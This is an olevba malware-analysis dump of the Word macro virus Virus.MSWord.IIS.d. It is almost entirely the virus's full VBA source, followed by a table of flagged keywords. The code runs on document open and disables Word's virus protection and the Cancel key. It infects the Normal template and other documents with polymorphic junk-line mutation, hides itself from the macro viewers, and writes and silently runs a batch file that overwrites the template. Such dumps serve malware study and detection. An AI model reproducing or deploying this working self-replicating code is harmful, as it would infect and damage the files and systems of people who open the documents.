olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.d-b247e9cdaaebc6de8ec4fb107238299cac93170a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.d-b247e9cdaaebc6de8ec4fb107238299cac93170a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.IIS.d-b247e9cdaaebc6de8ec4fb107238299cac93170a - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
‰ = Chr(5)
±£àî—šù�Þ‹ãí½«½”Ú¹®¯Þ�ëùùå“ò“›¨ _
= Chr(76)
Application.ShowVisualBasicEditor _
= _
False
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr _
NormalTemplate.FullName, vbNormal
NoSet:
begin:
On _
Error _
GoTo _
eb
NormAt = False
VBE.CommandBars("Edit").Controls(1).Enabled = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros _
0
Options.VirusProtection = False
Options.ConfirmConversions = False
Application.ScreenUpdating = False
Options.SaveNormalPrompt = False
Close _
#1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line _
Input _
#1, _
a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir _
= _
Mid(a, _
8, l)
End _
If
Loop
If windir = "" Then Exit Sub
On _
Error _
GoTo _
NoInf
ms = NormalTemplate.VBProject.VBComponents.Count
For _
t2 _
= _
1 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls _
> _
3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT = 1
Exit _
For
End _
If
Next _
t2
ms = ActiveDocument.VBProject.VBComponents.Count
For _
tg _
= _
1 To ms
ls = ActiveDocument.VBProject.VBComponents(tg).CodeModule.countoflines
If _
ls _
> _
3 Then l = ActiveDocument.VBProject.VBComponents(tg).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd = 1
Exit _
For
End _
If
Next _
tg
If _
Acd _
= _
1 And NormT = 1 Then Exit Sub
If _
Acd _
= _
1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
t = 0
Randomize _
Timer
t _
= _
CInt(Rnd _
* 100)
If _
t _
< _
50 Then g = 1
If _
t _
> _
49 And t < 101 Then g = 2
If _
g _
= _
1 Then
v _
= _
CInt(Rnd _
* 50)
For _
vs _
= _
1 To v
beginNn:
z _
= _
CInt(Rnd _
* 250)
If _
z _
= _
13 Then GoTo beginNn
If _
z _
< _
65 Then GoTo beginNn
If _
z _
< _
130 Then GoTo beginNn
va _
= _
va _
& Chr(z)
Next _
vs
v _
= _
CInt(Rnd _
* 20)
For _
vss _
= _
1 To v
begin5:
z _
= _
CInt(Rnd _
* 250)
If _
z _
= _
13 Then GoTo begin5
If _
z _
= _
34 Then GoTo begin5
If _
z _
< _
130 Then GoTo begin5
Inn _
= _
Inn _
& Chr(z)
Next _
vss
FullCodeN = FullCodeN & va & "=" & Chr(34) & Inn & Chr(34) & Chr(13)
End _
If
If _
g _
= _
2 Then
v _
= _
CInt(Rnd _
* 50)
For _
vsss _
= _
1 To v
begin2:
z _
= _
CInt(Rnd _
* 250)
If _
z _
= _
13 Then GoTo begin2
If _
z _
< _
130 Then GoTo begin2
va _
= _
va _
& Chr(z)
Next _
vsss
z _
= _
CInt(Rnd _
* 250)
Inn = "Chr(" & z & ")"
FullCodeN = FullCodeN & va & "=" & Inn & Chr(13)
End _
If
If _
g _
= _
3 Then
v _
= _
CInt(Rnd _
* 50)
va = "'"
For _
vssss _
= _
1 To v
begin3:
z _
= _
CInt(Rnd _
* 250)
If _
z _
= _
13 Then GoTo begin3
If _
z _
< _
130 Then GoTo begin3
va _
= _
va _
& Chr(z)
Next _
vssss
FullCodeN _
= _
FullCodeN _
& va & Chr(13)
End _
If
If _
g _
= _
4 Then
v _
= _
CInt(Rnd _
* 50)
For _
vsssss _
= _
1 To v
begin4:
z _
= _
CInt(Rnd _
* 250)
If _
z _
= _
13 Then GoTo begin4
If _
z _
< _
130 Then GoTo begin4
va _
= _
va _
& Chr(z)
Next _
vsssss
va = va & ":"
FullCodeN _
= _
FullCodeN _
& va & Chr(13)
End _
If
aaaa = ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.countoflines
hh = 1
Do
If _
hh _
= _
aaaa Then GoTo nextterm
hh _
= _
hh _
+ 1
a _
= _
ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.Lines(hh, _
1)
If Right(a, 1) = ":" Then
FullCodeN _
= _
FullCodeN _
& a & Chr(13)
GoTo _
NextLineN
End _
If
Spac = 0
t = 0
PosL = 0
BeginN:
l = Len(a)
Do
If _
PosL _
> _
l Then GoTo NoCN
PosL _
= _
PosL _
+ 1
If _
Mid(a, _
PosL, _
1) = Chr(34) Then
FullCodeN _
= _
FullCodeN _
& a & Chr(13)
GoTo _
NextLineN
End _
If
Loop
NoCN:
PosL = 0
If Right(a, 1) = "_" Then GoTo UnsplitN
GoTo _
SplitN
UnsplitN:
v = 0
y = a
Do
If Right(y, 1) <> "_" Then GoTo NoChN
l = Len(y)
PosL = 0
Do
PosL _
= _
PosL _
+ 1
s _
= _
Mid(y, _
PosL, 1)
If s = "_" Then GoTo FoundN
Loop
FoundN:
Spac _
= _
PosL _
- 1
y _
= _
Left(y, _
l - 1)
hh _
= _
hh _
+ 1
a _
= _
ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.Lines(hh, _
1)
v = 1
y _
= _
y _
& a
Loop
NoChN:
a = y
c = 0
PoslO = 0
PosL = 0
GoTo _
BeginN
SplitN:
PosL = 0
l = Len(a)
k = 0
If _
Spac _
<> _
0 Then
Do
k _
= _
k _
+ 1
If _
k _
> _
l Then GoTo NC
s _
= _
Mid(a, _
k, 1)
If s = " " Then g = k
Loop
NC:
If _
g _
<= _
Spac Then
FullCodeN _
= _
FullCodeN _
& a & Chr(13)
GoTo _
NextLineN
End _
If
End _
If
Do
If _
PosL _
> _
l Then
FullCodeN _
= _
FullCodeN _
& a & Chr(13)
GoTo _
NextLineN
End _
If
PosL _
= _
PosL _
+ 1
s _
= _
Mid(a, _
PosL, 1)
If _
s _
= _
Chr(34) Then
FullCodeN _
= _
FullCodeN _
& a & Chr(13)
GoTo _
NextLineN
End _
If
If s = " " Then
If _
Spac _
= _
0 Then
f = Left(a, PosL) & " " & "_"
las _
= _
Mid(a, _
PosL + 1, l)
FullCodeN _
= _
FullCodeN _
& f & Chr(13)
FullCodeN _
= _
FullCodeN _
& las & Chr(13)
GoTo _
NextLineN
End _
If
If _
PosL _
<= _
Spac Then
wa _
= _
PosL _
- PoslO
If _
PoslO _
<> _
0 Then
Temp = Mid(a, PoslO, wa) & " " & "_"
Else
Temp = Mid(a, 1, PosL) & " " & "_"
End _
If
FullCodeN _
= _
FullCodeN _
& _
Temp _
& Chr(13)
PoslO = PosL + 1
c = 1
GoTo _
NextCharN
Else
c = 1
wa _
= _
PosL _
- (PoslO)
Temp = Mid(a, PoslO, wa) & " " & "_"
Temp2 _
= _
Mid(a, _
PosL + 1, l)
FullCodeN _
= _
FullCodeN _
& Temp & Chr(13) & Temp2 & Chr(13)
If _
PosL _
> _
Spac Then GoTo NextLineN
GoTo _
NextCharN
End _
If
Temp = Mid(a, PoslO + 1, PosL) & " " & "_"
FullCodeN _
= _
FullCodeN _
& Temp & Chr(13)
GoTo _
NextLineN
End _
If
NextCharN:
Loop
FullCodeN _
= _
FullCodeN _
& y & Chr(13)
GoTo _
NextLineN
NextLineN:
Loop
nextterm:
End _
If
If _
NormT _
= _
1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
t = 0
Randomize _
Timer
t _
= _
CInt(Rnd _
* 100)
If _
t _
< _
50 Then g = 1
If _
t _
> _
49 And t < 101 Then g = 2
If _
g _
= _
1 Then
v _
= _
CInt(Rnd _
* 50)
For _
vDs _
= _
1 To v
beginDD:
z _
= _
CInt(Rnd _
* 250)
If _
z _
= _
13 Then GoTo beginDD
If _
z _
< _
65 Then GoTo beginDD
If _
z _
< _
130 Then GoTo beginDD
va _
= _
va _
& Chr(z)
Next _
vDs
v _
= _
CInt(Rnd _
* 20)
For _
vDss _
= _
1 To v
beginD5:
z _
= _
CInt(Rnd _
* 250)
If _
z _
= _
13 Then GoTo beginD5
If _
z _
= _
34 Then GoTo beginD5
If _
z _
< _
130 Then GoTo beginD5
Inn _
= _
Inn _
& Chr(z)
Next _
vDss
FullCodeD = FullCodeD & va & "=" & Chr(34) & Inn & Chr(34) & Chr(13)
End _
If
If _
g _
= _
2 Then
v _
= _
CInt(Rnd _
* 50)
For _
vDsss _
= _
1 To v
beginD2:
z _
= _
CInt(Rnd _
* 250)
If _
z _
= _
13 Then GoTo beginD2
If _
z _
< _
130 Then GoTo beginD2
va _
= _
va _
& Chr(z)
Next _
vDsss
z _
= _
CInt(Rnd _
* 250)
Inn = "Chr(" & z & ")"
FullCodeD = FullCodeD & va & "=" & Inn & Chr(13)
End _
If
If _
g _
= _
3 Then
v _
= _
CInt(Rnd _
* 50)
va = "'"
For _
vdssss _
= _
1 To v
beginD3:
z _
= _
CInt(Rnd _
* 250)
If _
z _
= _
13 Then GoTo beginD3
If _
z _
< _
130 Then GoTo beginD3
va _
= _
va _
& Chr(z)
Next _
vdssss
FullCodeD _
= _
FullCodeD _
& va & Chr(13)
End _
If
If _
g _
= _
4 Then
v _
= _
CInt(Rnd _
* 50)
For _
vdsssss _
= _
1 To v
beginD4:
z _
= _
CInt(Rnd _
* 250)
If _
z _
= _
13 Then GoTo beginD4
If _
z _
< _
130 Then GoTo beginD4
va _
= _
va _
& Chr(z)
Next _
vdsssss
va = va & ":"
FullCodeD _
= _
FullCodeD _
& va & Chr(13)
End _
If
aaaa = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
hh = 1
Do
If _
hh _
= _
aaaa Then GoTo EndTerm
hh _
= _
hh _
+ 1
a _
= _
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(hh, _
1)
If Right(a, 1) = ":" Then
FullCodeD _
= _
FullCodeD _
& a & Chr(13)
GoTo _
NextLineD
End _
If
Spac = 0
t = 0
PosL = 0
beginD:
l = Len(a)
Do
If _
PosL _
> _
l Then GoTo NoCD
PosL _
= _
PosL _
+ 1
If _
Mid(a, _
PosL, _
1) = Chr(34) Then
FullCodeD _
= _
FullCodeD _
& a & Chr(13)
GoTo _
NextLineD
End _
If
Loop
NoCD:
PosL = 0
If Right(a, 1) = "_" Then GoTo UnsplitD
GoTo _
SplitD
UnsplitD:
v = 0
y = a
Do
If Right(y, 1) <> "_" Then GoTo NoChD
l = Len(y)
PosL = 0
Do
PosL _
= _
PosL _
+ 1
s _
= _
Mid(y, _
PosL, 1)
If s = "_" Then GoTo FoundD
Loop
FoundD:
Spac _
= _
PosL _
- 1
y _
= _
Left(y, _
l - 1)
hh _
= _
hh _
+ 1
a _
= _
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(hh, _
1)
v = 1
y _
= _
y _
& a
Loop
NoChD:
a = y
c = 0
PoslO = 0
PosL = 0
GoTo _
beginD
SplitD:
PosL = 0
l = Len(a)
k = 0
If _
Spac _
<> _
0 Then
Do
k _
= _
k _
+ 1
If _
k _
> _
l Then GoTo DC
s _
= _
Mid(a, _
k, 1)
If s = " " Then g = k
Loop
DC:
If _
g _
<= _
Spac Then
FullCodeD _
= _
FullCodeD _
& a & Chr(13)
GoTo _
NextLineD
End _
If
End _
If
Do
If _
PosL _
> _
l Then
FullCodeD _
= _
FullCodeD _
& a & Chr(13)
GoTo _
NextLineD
End _
If
PosL _
= _
PosL _
+ 1
s _
= _
Mid(a, _
PosL, 1)
If _
s _
= _
Chr(34) Then
FullCodeD _
= _
FullCodeD _
& a & Chr(13)
GoTo _
NextLineD
End _
If
If s = " " Then
If _
Spac _
= _
0 Then
f = Left(a, PosL) & " " & "_"
las _
= _
Mid(a, _
PosL + 1, l)
FullCodeD _
= _
FullCodeD _
& f & Chr(13)
FullCodeD _
= _
FullCodeD _
& las & Chr(13)
GoTo _
NextLineD
End _
If
If _
PosL _
<= _
Spac Then
wa _
= _
PosL _
- PoslO
If _
PoslO _
<> _
0 Then
Temp = Mid(a, PoslO, wa) & " " & "_"
Else
Temp = Mid(a, 1, PosL) & " " & "_"
End _
If
FullCodeD _
= _
FullCodeD _
& _
Temp _
& Chr(13)
PoslO = PosL + 1
c = 1
GoTo _
NextCharD
Else
c = 1
wa _
= _
PosL _
- (PoslO)
Temp = Mid(a, PoslO, wa) & " " & "_"
Temp2 _
= _
Mid(a, _
PosL + 1, l)
FullCodeD _
= _
FullCodeD _
& Temp & Chr(13) & Temp2 & Chr(13)
If _
PosL _
> _
Spac Then GoTo NextLineD
GoTo _
NextCharD
End _
If
Temp = Mid(a, PoslO + 1, PosL) & " " & "_"
FullCodeD _
= _
FullCodeD _
& Temp & Chr(13)
GoTo _
NextLineD
End _
If
NextCharD:
Loop
FullCodeD _
= _
FullCodeD _
& y & Chr(13)
GoTo _
NextLineD
NextLineD:
Loop
EndTerm:
End _
If
If _
NormT _
<> _
1 Then
look:
ms = NormalTemplate.VBProject.VBComponents.Count
For _
Inn _
= _
2 To ms
a = NormalTemplate.VBProject.VBComponents(Inn).CodeModule.countoflines
If _
a _
< _
1 Then
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.AddFromstring _
(FullCodeN)
i = 20
Exit _
For
End _
If
Next _
Inn
If _
i _
<> _
20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look
End _
If
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAtt = ActiveDocument.ReadOnly
l = ""
On _
Error _
GoTo _
eb
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
NormalTemplate.Saved = True
ActiveDocument.Saved = True
ActiveDocument.Close
Close _
#1
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l _
= _
l _
- 10
For _
i _
= _
1 To 500
Print #1, "rem Flitnic has catched you... he, he"
Next _
i
Print #1, ":Begin"
Print #1, "Move /y c:\Troop.dat " & NormalTemplate.FullName
Print #1, "If exist c:\Troop.dat goto Begin"
Close _
#1
NormalTemplate.Saved = True
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If _
NormAt _
= _
True Then
End _
If
notemp:
End _
If
i = 1
If _
Acd _
<> _
1 Then
Close
look2:
ms = ActiveDocument.VBProject.VBComponents.Count
For _
inn2 _
= _
2 To ms
a = ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If _
a _
< _
1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring _
(FullCodeD)
i = 20
Exit _
For
End _
If
Next _
inn2
If _
i _
<> _
20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look2
End _
If
On _
Error _
GoTo _
0
If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If _
ActiveDocument.ReadOnly _
= _
True Then GoTo noactsave
On _
Error _
Resume _
Next
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End _
If
End _
If
NoInf:
eb:
a = Dir(NormalTemplate.FullName)
If a = "" Then
NormalTemplate.Saved = False
GoTo _
NoNormal
End _
If
If _
NormAtt _
= _
True Then
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
SetAttr (NormalTemplate.FullName), vbNormal
a = Shell(windir & "\System\lo.bat", 0)
Else
NormalTemplate.Save
End _
If
NormalTemplate.Saved = True
NoNormal:
End _
Sub
Sub _
ViewVbCode()
On _
Error _
GoTo _
NoDoc
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr (NormalTemplate.FullName), vbNormal
NoSet:
Close _
#1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line _
Input _
#1, _
a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir _
= _
Mid(a, _
8, l)
End _
If
Loop
Close _
#1
If windir = "" Then Exit Sub
ms = ActiveDocument.VBProject.VBComponents.Count
For _
t _
= _
1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If _
ls _
> _
3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd = 1
Exit _
For
End _
If
Next _
t
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
NoDoc:
ms = NormalTemplate.VBProject.VBComponents.Count
For _
t2 _
= _
2 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls _
> _
3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT = 1
Exit _
For
End _
If
Next _
t2
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For _
i _
= _
1 To 2
al = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, al
Next _
i
esub:
eb:
Application.ShowVisualBasicEditor = True
NoDocL:
Options.SaveNormalPrompt = False
NormalTemplate.Saved = True
End _
Sub
Sub _
ToolsMacro()
On _
Error _
GoTo _
NoDoc
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr (NormalTemplate.FullName), vbNormal
NoSet:
ms = ActiveDocument.VBProject.VBComponents.Count
For _
t _
= _
1 To ms
ls = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If _
ls _
> _
3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd = 1
Exit _
For
End _
If
Next _
t
If _
Acd _
= _
1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For _
ii _
= _
2 To a
l _
= _
ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, _
1)
FullCodeN _
= _
FullCodeN _
& l & Chr(13)
FullCodeD _
= _
FullCodeD _
& l & Chr(13)
Next _
ii
End _
If
a = ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines 1, a
ActiveDocument.Saved = True
ActiveDocument.Saved = True
NoDoc:
ms = NormalTemplate.VBProject.VBComponents.Count
For _
t2 _
= _
1 To ms
ls = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls _
> _
3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT = 1
Exit _
For
End _
If
Next _
t2
If _
NormT _
= _
1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For _
iiii _
= _
2 To a
l _
= _
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, _
1)
FullCodeD _
= _
FullCodeD _
& l & Chr(13)
FullCodeN _
= _
FullCodeN _
& l & Chr(13)
Next _
iiii
End _
If
l = ""
On _
Error _
GoTo _
0
On _
Error _
GoTo _
eb
a = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, a
NormalTemplate.Saved = True
esub:
Close _
#1
Open "c:\msdos.sys" For Input As #1
Do Until EOF(1)
Line _
Input _
#1, _
a
If Left(UCase(a), 7) = "WINDIR=" Then
l = Len(a)
windir _
= _
Mid(a, _
8, l)
End _
If
Loop
Close _
#1
If windir = "" Then Exit Sub
a = GetAttr(NormalTemplate.FullName)
If _
a _
= _
33 Then a = 1
If _
a _
= _
1 Then GoTo eb
eb:
NormalTemplate.Saved = True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf = True
If _
Application.ShowVisualBasicEditor _
= _
True Then ReInf = False
If _
ReInf _
= _
True Then
Acd = 0
NormT = 0
If _
NormT _
<> _
1 Then
NormalTemplate.OpenAsDocument
NormAt = ActiveDocument.ReadOnly
ActiveDocument.Close
Close _
#1
look:
ms = NormalTemplate.VBProject.VBComponents.Count
For _
Inn _
= _
2 To ms
a = NormalTemplate.VBProject.VBComponents(Inn).CodeModule.countoflines
If _
a _
< _
1 Then
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.AddFromstring _
(FullCodeN)
i = 20
Exit _
For
End _
If
Next _
Inn
If _
i _
<> _
20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look
End _
If
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If _
NormAt _
= _
True Then
NormalTemplate.Saved = True
End _
If
End _
If
i = 1
If _
NormAt _
<> _
True Then NormalTemplate.Save
notemp:
If _
Acd _
<> _
1 Then
Close
look2:
a = Application.Documents.Count
If _
a _
< _
1 Then GoTo NoDocL
ms = ActiveDocument.VBProject.VBComponents.Count
For _
inn2 _
= _
2 To ms
a = ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If _
a _
< _
1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring _
(FullCodeD)
i = 20
Exit _
For
End _
If
Next _
inn2
If _
i _
<> _
20 Then
Close _
#1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close _
#1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close _
#1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo _
look2
End _
If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If _
ActiveDocument.ReadOnly _
= _
True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End _
If
End _
If
NoDocL:
Else
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For _
i _
= _
1 To 2
al = NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines 1, al
NormalTemplate.Saved = True
Next _
i
End _
If
Options.SaveNormalPrompt = False
NormalTemplate.Saved = True
End _
Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lo.bat              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

